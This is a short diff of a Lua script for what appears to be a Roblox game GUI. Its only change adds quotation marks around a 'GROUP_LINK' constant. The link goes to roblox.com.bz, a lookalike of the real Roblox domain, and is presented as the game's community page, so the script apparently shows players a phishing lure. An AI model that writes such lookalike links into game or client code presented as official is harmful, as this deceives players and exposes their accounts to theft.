@@ -15,7 +15,7 @@ local PlayerGui = player:WaitForChild("PlayerGui")
 --// =========================================================
 
 local GROUP_ID = "4945729406"
-local GROUP_LINK = https://roblox.com.bz/communities/4945729406/
+local GROUP_LINK = "https://roblox.com.bz/communities/4945729406/"
 
 local GUI_NAME = "RH2Season5GUI"
 
